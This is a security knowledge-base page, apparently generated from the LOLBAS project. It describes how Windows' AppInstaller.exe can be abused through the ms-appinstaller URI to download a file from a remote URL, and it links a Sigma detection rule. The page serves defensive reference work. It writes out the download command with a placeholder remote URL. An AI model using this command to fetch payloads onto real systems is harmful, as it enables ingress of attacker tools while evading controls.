---
title: "AppInstaller.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OSBinaries/AppInstaller.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/AppInstaller.yml"
build_date: "2026-04-27 18:39:01"
category: "OSBinaries"
aliases:
  - "AppInstaller.exe"
functions:
  - "Download"
attack_technique_ids:
  - "T1105"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# AppInstaller.exe

Tool used for installation of AppX/MSIX applications on Windows 10

## Metadata

- Category: OSBinaries
- Created: 2020-12-02
- Author: Wade Hickey
- Source Path: yml/OSBinaries/AppInstaller.yml

## Paths

- `C:\Program Files\WindowsApps\Microsoft.DesktopAppInstaller_1.11.2521.0_x64__8wekyb3d8bbwe\AppInstaller.exe`

## Commands

### 1. Download

AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL and is saved in INetCache.

```cmd
start ms-appinstaller://?source={REMOTEURL:.exe}
```

- Use Case: Download file from Internet
- Privileges: User
- Operating System: Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/dns_query/dns_query_win_lolbin_appinstaller.yml

## Resources

- {'Link': 'https://twitter.com/notwhickey/status/1333900137232523264'}

## Acknowledgements

- {'Person': 'Wade Hickey', 'Handle': '@notwhickey'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/AppInstaller.yml)
